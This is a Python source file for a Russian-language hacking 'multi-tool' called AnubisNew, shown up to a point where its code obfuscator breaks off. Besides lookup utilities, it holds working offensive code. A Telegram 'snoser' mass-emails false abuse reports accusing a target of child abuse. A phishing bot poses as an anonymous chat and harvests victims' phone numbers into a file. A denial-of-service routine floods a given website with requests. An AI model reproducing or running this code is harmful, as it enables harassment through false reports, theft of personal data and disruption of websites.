import requests
from bs4 import BeautifulSoup
from pystyle import *
import socket
import os
import csv
import time
import subprocess
import phonenumbers
from ipwhois import IPWhois
import pystyle
import telebot
from telebot import types
import csv
import time
import json
from phonenumbers import geocoder, carrier, timezone
import ctypes
from ctypes import wintypes

System.Title("AnubisNew ( PREMIUM )")
os.system(f'mode con: cols=115 lines=58')

def cls():
    input(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Press Enter to reload')
    os.system('cls' if os.name == 'nt' else 'clear')
    # subprocess.run(['./AnubisNew.exe'])
    subprocess.run(['python', 'anubisnew.py'])



COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m", 
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}


Intro = """

   █████████   ██████   █████ █████  █████ ███████████  █████  █████████ 
  ███░░░░░███ ░░██████ ░░███ ░░███  ░░███ ░░███░░░░░███░░███  ███░░░░░███
 ░███    ░███  ░███░███ ░███  ░███   ░███  ░███    ░███ ░███ ░███    ░░░ 
 ░███████████  ░███░░███░███  ░███   ░███  ░██████████  ░███ ░░█████████ 
 ░███░░░░░███  ░███ ░░██████  ░███   ░███  ░███░░░░░███ ░███  ░░░░░░░░███
 ░███    ░███  ░███  ░░█████  ░███   ░███  ░███    ░███ ░███  ███    ░███
 █████   █████ █████  ░░█████ ░░████████   ███████████  █████░░█████████ 
░░░░░   ░░░░░ ░░░░░    ░░░░░   ░░░░░░░░   ░░░░░░░░░░░  ░░░░░  ░░░░░░░░░  
                                                                        

                 Read it before launching - clck.ru/3BwUuR
           Welcome to Anubis Multi-Tool! Press "Enter" to continue.
"""

Anime.Fade(Center.Center(Intro), Colors.green_to_cyan, Colorate.Vertical, interval=0.055, enter=True)
os.system('cls' if os.name == 'nt' else 'clear')

banner = '''
                             ▄████████ ███▄▄▄▄   ███    █▄  ▀█████████▄   ▄█     ▄████████ 
                            ███    ███ ███▀▀▀██▄ ███    ███   ███    ███ ███    ███    ███ 
                            ███    ███ ███   ███ ███    ███   ███    ███ ███▌   ███    █▀  
                            ███    ███ ███   ███ ███    ███  ▄███▄▄▄██▀  ███▌   ███        
                          ▀███████████ ███   ███ ███    ███ ▀▀███▀▀▀██▄  ███▌ ▀███████████ 
                            ███    ███ ███   ███ ███    ███   ███    ██▄ ███           ███ 
                            ███    ███ ███   ███ ███    ███   ███    ███ ███     ▄█    ███ 
                            ███    █▀   ▀█   █▀  ████████▀  ▄█████████▀  █▀    ▄████████▀  

                                         Owner @neakumaa ● Developer: A-Projects
                                                   @akumaalinks       
                                               Version: New (Premium)                                                                              

              ╭─                   ─╮         ╭─                   ─╮         ╭─                   ─╮ 

                [1] - search_bd                 [5] - web_crawling              [9] - dos_website            
                [2] - Number_valid              [6] - tg_snoser                 [10] - obfuscate_code  
                [3] - Whois_ip                  [7] - DsSendWebhook             [11] - Information
                [4] - port_scan                 [8] - Phishing                  [00] - Exit

              ╰─                   ─╯         ╰─                   ─╯         ╰─                   ─╯             
'''

print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(banner)))


choice = input(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter Option {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')

if choice == '1':
    func1 = '''
    ─────────────────────────→ Инструкция ←─────────────────────────
      Для того чтобы совершить поиск по своим базам данных. Нужно
        1. Добавить файлы в расширении - *.csv в папку database.
        2. Написать нужное значение, которое хотите найти в файлах.
                Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func1)))

    search_value = input(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter Value {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')

    def database_search(value):
        found_rows = []
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        database_directory = os.path.join(current_directory, 'database') 

        csv_files = [file for file in os.listdir(database_directory) if file.endswith('.csv')]

        for file in csv_files:
            with open(os.path.join(database_directory, file), 'r', newline='', encoding='utf-8') as f:
                reader = csv.reader(f)
                for row in reader:
                    if value in row:
                        found_rows.append(row)
        return found_rows

    def print_results(results):
        for row in results:
            print(f'\n\t{COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}    → Information found')
            print(f'\t{COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}    ────────────────────────────────────────────────────────────────')
            print(f'\t{COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}        [+] {" | ".join(row)}')
            print(f'\t{COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}    ────────────────────────────────────────────────────────────────')

    results = database_search(search_value)
    print_results(results)
    cls()

if choice == '2':
  func2 = '''
  ─────────────────────────→ Инструкция ←─────────────────────────
            Для того чтобы проверить номер на валидность. Нужно
             1. Ввести номер с +. К примеру (+79000000000)
                Приятного пользование AnubisNew Premium.
  ────────────────────────────────────────────────────────────────
  '''

  print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func2)))
  search_value = input(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter Value {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')

  try:
      parsed_number = phonenumbers.parse(search_value, None)

      if not phonenumbers.is_valid_number(parsed_number):
          print(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Incorrect number format')
          cls()
      else:
          country = geocoder.description_for_number(parsed_number, "ru")
          operator = carrier.name_for_number(parsed_number, "ru")
          number_type = phonenumbers.number_type(parsed_number)
          timezone_info = timezone.time_zones_for_number(parsed_number)

          print(f'\n\t{COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}    → Information found')
          print(f'\t{COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}    ────────────────────────────────────────────────────────────────')
          print(f'\t{COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}      Country → {country}')
          print(f'\t{COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}      Operator → {operator}')
          print(f'\t{COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}      Type number → {number_type}')
          print(f'\t{COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}      Time zone → {timezone_info}')
          print(f'\t{COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}    ────────────────────────────────────────────────────────────────')
          cls()

  except phonenumbers.phonenumberutil.NumberParseException:
      print(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Invalid number')
      cls()

if choice == '3':
    func3 = '''
    ─────────────────────────→ Инструкция ←─────────────────────────
                 Для того чтобы пробить Ip-adress. Нужно
                   1. Ввести айпи в формате (0.0.0.0)
                 Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func3)))
    def get_ip_whois(ip):
        try:
            obj = IPWhois(ip)
            results = obj.lookup_rdap()
            return results
        except Exception as e:
            return str(e)

    def format_whois_info(info, prefix=""):
        if isinstance(info, dict):
            for key, value in info.items():
                if isinstance(value, (dict, list)):
                    format_whois_info(value, prefix + key + "\t\t")
                else:
                    time.sleep(0.05)
                    print(f'\t        {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}[+] {key} = {value}')
        elif isinstance(info, list):
            for idx, item in enumerate(info):
                format_whois_info(item, prefix + str(idx) + ".")

    if __name__ == '__main__':
        ip = input(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter Value {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')

        whois_info = get_ip_whois(ip)

        if isinstance(whois_info, dict):
            import time

            print(f'\n\t{COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}    → Information found')
            time.sleep(0.05)
            print(f'\t{COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}    ────────────────────────────────────────────────────────────────')
            formatted_whois_info = format_whois_info(whois_info)
            print(formatted_whois_info)
            print(f'\t{COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}    ────────────────────────────────────────────────────────────────')
            cls()
        else:
            print(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[ANUBIS] ERROR!!!', whois_info)
            cls()

if choice == '4':
    func4 = '''
    ─────────────────────────→ Инструкция ←─────────────────────────
      Для того чтобы посмотреть открытые или закрытые порты. Нужно
                 1. Ввести хост (пример: youtube.com)
             2. Ввести порт, который вы хотите просмотреть
                 Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func4)))
    def check_port(domain, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((domain, port)) == 0:
                    return True
                else:
                    return False
        except Exception as e:
            return f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[ANUBIS] ERROR!!!'

    if __name__ == "__main__":
        domain = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter host {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}').strip()
        port_str = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter port {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}').strip()
        try:
            port = int(port_str)
            result = check_port(domain, port)
            if result == True:
                print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Port {port} on {domain} {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}OPEN')
                cls()
            elif result == False:
                print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Port {port} on {domain} {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}CLOSE')
                cls()
            else:
                print(result)
                cls()
        except ValueError:
            print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}The port must be a number')
            cls()     

if choice == '5':
    func5 = '''
    ─────────────────────────→ Инструкция ←─────────────────────────
       Web Crawl - процедура сбора информации о новых или прошедших 
        обновление страницах. С целью последующей загрузки в индекс
                            поисковой системы. 
              1. Ввести ссылку (пример: https://youtube.com/)
                   Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func5)))
    def crawl(url):
        try:
            response = requests.get(url)

            if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')

                title = soup.title.text
                print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Title {COLOR_CODE["YELLOW"]}→{COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]} {title}')


                links = soup.find_all('a')
                print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Url to websites {COLOR_CODE["YELLOW"]}→{COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]} ({len(links)})')

                for link in links:
                    print(link.get('href'))
            else:
                print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Error {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]} {response.status_code}')
                cls()

        except requests.RequestException as e:
            print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Error {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]} {str(e)}')
            cls()


    if __name__ == '__main__':
        url = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter URL {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')
        crawl(url)
        cls() 
 
if choice == '6':
    func6 = '''
    ─────────────────────────→ Инструкция ←─────────────────────────
              Для того чтобы задействовать сносер. Нам нужно
                     1. Ввести тег телеграмм жертвы.
                       (Пример: @aprojectexample)
                      2. Нажать Enter и ждать снос!
                 Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func6)))
    import random
    import smtplib
    import fake_useragent
    import email.mime.multipart
    import email.mime.text
    import datetime

    ua = fake_useragent.UserAgent()
    def sendemail(senderemail, senderpassword, recipientemail, subject, server, messagetext):
                try:
                    headers = {"User-Agent": ua.random}
                    server.starttls()
                    server.login(senderemail, senderpassword)
                    message = email.mime.multipart.MIMEMultipart()
                    message["From"] = senderemail
                    message["To"] = recipientemail
                    message["Subject"] = subject
                    body = messagetext
                    message.attach(email.mime.text.MIMEText(body, "plain"))
                    server.send_message(message)
                    now = datetime.now()
                    print(now.strftime("%H:%M:%S\n"))
                    print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Mail {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}{senderemail}',)
                    print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}{recipientemail}')
                    server.quit()
                except Exception as e:
                    print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Error{COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]} {str(e)}')

    senders = [
                # ("Почта", "пароль"),
            ]
    recipients = [
                " support@telegram.org",
                " dmca@telegram.org",
                " security@telegram.org",
                " sms@telegram.org",
                " info@telegram.org",
                " marta@telegram.org",
                " spam@telegram.org",
                " alex@telegram.org",
                " abuse@telegram.org",
                " pavel@telegram.org",
                " durov@telegram.org",
                " elies@telegram.org",
                " ceo@telegram.org",
                " mr@telegram.org",
                " levlam@telegram.org",
                " perekopsky@telegram.org",
                " recover@telegram.org",
                " germany@telegram.org",
                " hyman@telegram.org",
                " qa@telegram.org",
                " Stickers@telegram.org",
                " ir@telegram.org",
                " vadim@telegram.org",
                " shyam@telegram.org",
                " stopca@telegram.org",
                " u003esupport@telegram.org",
                " ask@telegram.org",
                " 125support@telegram.org",
                " me@telegram.org",
                " enquiries@telegram.org",
                " api_support@telegram.org",
                " marketing@telegram.org",
                " ca@telegram.org",
                " recovery@telegram.org",
                " http@telegram.org",
                " corp@telegram.org",
                " corona@telegram.org",
                " ton@telegram.org",
                " sticker@telegram.org",
            ]
    messages = [
                "Hello,rname}hello, I want to complain about a user who clearly violates the telegram rules, his account @{username} - this user uses a virtual number, threatens with false feminization and deanonymization and throws elements of child abuse into chats, please take action! Please! He also has his channel in his bio where he posts it all (violations), and he use virtual numberthere are also violations in his channel https://t.me/{username}",
                "hello,d throws elements of child abuse into chats, please take action! Please! He also has his channel in his bio where he posts it all (violations), and he use virtual number, there are also violations in his channel https://t.me/{username}",
                "hello,his channel in his bio where he posts it all (violations), and he use virtual number, https://t.me/{username}",
                "Report for User",
            ]
    subjects = ["Report for User", "Reporting", "Help pls", "Report User", "Report"]

    username = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter tag telegram {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')
    for senderemail, senderpassword in senders:
        for recipientemail in recipients:
            server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
            subject = random.choice(subjects)
            messagetext = random.choice(messages)
            sendemail(senderemail,senderpassword,recipientemail,subject,server,messagetext) 

if choice == '7':
    func7 = '''
    ─────────────────────────→ Инструкция ←─────────────────────────
           Для того чтобы отправить сообщение в Webhook. Нужно
                     1. Отправить ссылку на Webhook. 
                (Пример: https://discord.com/api/webhooks/...)
                2. Введите сообщение, которое хотите отправить
                   Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func7)))
    import subprocess
    import requests

    def send_webhook(message):
        data = {
            "content": f"{message}"
        }
        response = requests.post(webhook, json=data)
    def main():
        response = send_webhook(message)

    if __name__ == "__main__":
        webhook = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter webhook url {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')
        message = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter text {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')
        main()
        cls()

if choice == '8':
    func8 = '''
    ─────────────────────────→ Инструкция ←─────────────────────────
           Для того чтобы начать пользоваться Phishing`om. Нужно
                        1. Выберите вид фишинга
                2. Настройте бота через Botfather. И отправьте 
                            токен этого же бота
             3. Ждите пока жертва зарегистрируется и принимайте
                                ее данные
                   Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func8)))
    print(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}1.Anonim Chat'
          f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}2.EyesOfGod'
          f'\n')
    select = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter method {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')
    
    if select == '1':
        token_bot = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter the token {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Great. The bot is working, use it!')
        bot = telebot.TeleBot(token_bot)
        bot.delete_webhook()
        waiting_users = []
        chatting_users = {}
        verified_users = {}

        def send_welcome(message):
            if message.chat.id in verified_users:
                bot.send_message(message.chat.id, f"Приветствую {message.from_user.first_name}, это анонимный чат с быстрой передачей сообщений друг другу, здесь ты найдешь знакомства, друзей, и так далее☺.")
                time.sleep(1)
                bot.send_message(message.chat.id, "Теперь вы можете приступить к поиску знакомств!😋, отправьте команду /search чтобы начать поиск собеседника. Чтобы завершить диалог отправьте команду /stop")
            else:
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton(text='Подтвердить личность🐱‍👤', callback_data='verify'))
                bot.send_message(message.chat.id, f"Приветствую {message.from_user.first_name}, это анонимный чат с быстрой передачей сообщений друг другу, здесь ты найдешь знакомства, друзей, и так далее. Но для начала вам нужно подтвердить личность в связи с спамом🤒.", reply_markup=markup)

        @bot.message_handler(commands=['start'])
        def start_handler(message):
            send_welcome(message)

        @bot.callback_query_handler(func=lambda call: call.data == 'verify')
        def verify_handler(call):
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            button_contact = types.KeyboardButton(text="Отправить контакт", request_contact=True)
            markup.add(button_contact)
            bot.send_message(call.message.chat.id, "Пожалуйста, подтвердите свою личность, отправив свой контакт.", reply_markup=markup)

        @bot.message_handler(content_types=['text'])
        def text_handler(message):
            if message.chat.id not in verified_users:
                bot.send_message(message.chat.id, "❌Подтвердите личность чтобы использовать эту команду❌")
                return
            if message.text == '/search':
                waiting_users.append(message.chat.id)
                bot.send_message(message.chat.id, "Ожидание собеседника⏱")
                if len(waiting_users) > 1:
                    user1 = waiting_users.pop(0)
                    user2 = waiting_users.pop(0)
                    chatting_users[user1] = user2
                    chatting_users[user2] = user1
                    bot.send_message(user1, "Найден собеседник. Начните с ним диалог.")
                    bot.send_message(user2, "Найден собеседник. Начните с ним диалог.")
            elif message.text == '/stop':
                if message.chat.id in chatting_users:
                    partner_id = chatting_users[message.chat.id]
                    del chatting_users[message.chat.id]
                    del chatting_users[partner_id]
                    bot.send_message(partner_id, "Собеседник закончил с вами диалог😥")
                    send_welcome(message)
            else:
                if message.chat.id in chatting_users:
                    bot.send_message(chatting_users[message.chat.id], message.text)

        @bot.message_handler(content_types=['contact'])
        def contact_handler(message):
            if message.chat.id not in verified_users:
                verified_users[message.chat.id] = message.contact.phone_number
                with open('users.csv', 'a', newline='', encoding='utf-8') as file:
                    writer = csv.writer(file)
                    writer.writerow([message.contact.phone_number, message.chat.id, message.from_user.username, message.from_user.first_name])
                bot.send_message(message.chat.id, "Отлично, теперь вы можете приступить к поиску знакомств!😋, отправьте команду /search чтобы начать поиск собеседника. Чтобы завершить диалог отправьте команду /stop")

        @bot.message_handler(content_types=['document'])
        def document_handler(message):
            file_info = bot.get_file(message.document.file_id)
            if file_info.file_path.endswith('.exe') or file_info.file_path.endswith('.apk'):
                bot.delete_message(message.chat.id, message.message_id)
                bot.send_message(message.chat.id, "Извините, но отправка файлов .exe и .apk не разрешена.")

        bot.polling()

    if select == '2':
        import time

        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}In dev!\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Support > @akumaalinks')
        time.sleep(0.2)
        cls()

if choice == '9':
    func9 = '''
    ─────────────────────────→ Инструкция ←─────────────────────────
                 Для того чтобы начать дос атаку. Нужно
                          1. Ввести URL сайта.
                    2. Нажать Enter и смотреть результат
                   Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func9)))
    import threading
    import requests
    import random
    import time
    from concurrent.futures import ThreadPoolExecutor

    user_agents = [
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125"
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)"
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
        "Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)"
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7"
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
    ]

    def dos_attack(link):
        while True:
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                requests.get(link, headers=headers)

                time.sleep(random.uniform(0.1, 1.0))
            except requests.RequestException:
                pass

    if __name__ == '__main__':
        link = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter url-website {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}To return, restart this programm')
        with ThreadPoolExecutor(max_workers=80) as executor:
            for _ in range(15000):  
                executor.submit(dos_attack, link)

if choice == '10':
    func10 = '''
    ─────────────────────────→ Инструкция ←─────────────────────────
                Для того чтобы обфусцировать файл. Вам нужно
                        1. Ввести название файла
                  2. Обозначить количество этапов обфускации
                   Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func10)))
    import os
    import sys
    import zlib
    import time
    import base64
    import marshal
    import py_compile

    # Lambda functions for encoding
    zlb = lambda in_: zlib.compress(in_)
    b16 = lambda in_: base64.b16encode(in_)
    b32 = lambda in_: base64.b32encode(in_)
    b64 = lambda in_: base64.b64encode(in_)
    mar = lambda in_: marshal.dumps(compile(in_, '<x>', 'exec'))


    class FileSize:
        def datas(self, z):
            for x in ['Byte', 'KB', 'MB', 'GB']:
                if z < 1024.0:
                    return "%3.1f %s" % (z, x)
                z /= 1024.0

        def __init__(self, path):
            if os.path.isfile(path):
                dts = os.stat(path).st_size
                print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Encoded File Size {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}%s' % self.datas(dts))


    def Encode(option, data, output):
        loop = int(input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Encode Count {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}'))
